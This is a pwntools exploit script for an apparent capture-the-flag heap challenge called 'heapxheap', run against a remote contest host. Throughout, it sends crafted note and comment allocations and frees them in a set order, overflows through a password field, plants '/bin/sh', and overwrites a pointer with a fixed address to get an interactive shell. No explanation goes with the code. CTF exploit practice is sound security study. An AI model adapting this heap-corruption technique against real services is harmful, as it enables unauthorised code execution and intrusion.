from pwn import *

HOST = "heapxheap.eatpwnnosleep.com"
PORT = 20000
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def new_node(msg):
  s.recvuntil('MENU>')
  s.sendline('1')
  s.recvuntil('NOTE :')
  s.send(msg)
def new_comment(num, size, comment):
  s.recvuntil('MENU>')
  s.sendline('3')
  s.recvuntil('[+] NODE NUMBER>')
  s.sendline(str(num))
  s.recvuntil('[+] COMMENT SIZE>')
  s.sendline(str(size))
  s.recvuntil('[+] SET COMMENT>')
  s.send(comment)
def delete_comment(num):
  s.recvuntil('MENU>')
  s.sendline('4')
  s.recvuntil('[-] NODE NUMBER>')
  s.sendline(str(num))
def password(dat):
  s.recvuntil('MENU>')
  s.sendline('8')
  s.recvuntil('[+] Input password (length : 6~55)')
  s.sendline(dat)
def edit_comment(num,dat):
  s.recvuntil('MENU>')
  s.sendline('5')
  s.recvuntil('[+] CHANGE NODE NUMBER>')
  s.sendline(str(num))
  s.recvuntil('[+]CHANGE COMMENT>')
  s.send(dat)
raw_input()
new_node("A"*0xff)
new_node("C"*0xff)
new_node("E"*0xff)
new_node("B"*0xff)
new_node("B"*0xff)
new_comment(1,0x38,"BBBB")
new_comment(2,0x100,"\x00"*0xf0+p64(0x100))
new_comment(3,0x100,"C"*0x10)
delete_comment(2)
delete_comment(1)
password("ToE_heap"+"A"*(56-8))
new_comment(4,0x80,"ABCD")
new_comment(5,0x60,"F"*0x5f)
delete_comment(4)
delete_comment(3)
new_node("/bin/sh")
edit_comment(5,p32(0x0400AD0))
s.interactive()
